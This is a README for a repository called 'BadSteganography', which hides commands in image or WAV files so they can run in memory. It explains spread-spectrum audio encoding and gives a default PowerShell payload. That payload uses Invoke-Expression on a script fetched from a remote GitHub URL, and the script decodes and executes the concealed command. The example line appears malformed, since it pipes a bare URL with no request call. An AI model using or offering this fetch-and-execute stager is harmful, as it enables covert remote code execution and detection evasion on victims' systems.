# BadSteganography
Bad Steganography is a repo for encoding commands into images or wav files to execute such in memory. 

# Spread Spectrum Encoding
The steganography method used in the provided script is a form of audio steganography known as spread spectrum encoding. In spread spectrum encoding, the hidden message is embedded in a way that spreads its energy across the frequency spectrum of the carrier signal. This makes the hidden message less susceptible to detection and removal by typical audio processing techniques.

# How it works (Spread Spectrum Encoding \Audio)
In this specific implementation, the amplitude of the audio samples is modified to represent the binary values of the message. By altering the amplitude, the hidden message is encoded into the audio signal, which can later be extracted using the same method.

# Example
This default payload grabs the contents of the decoder, which then downloads the audio to memory, decodes the message, and executes the command with Invoke-Expression
```
iex(https://raw.githubusercontent.com/CharlesTheGreat77/BadSteganography/main/spread_spectrum_decode.txt).Content
```
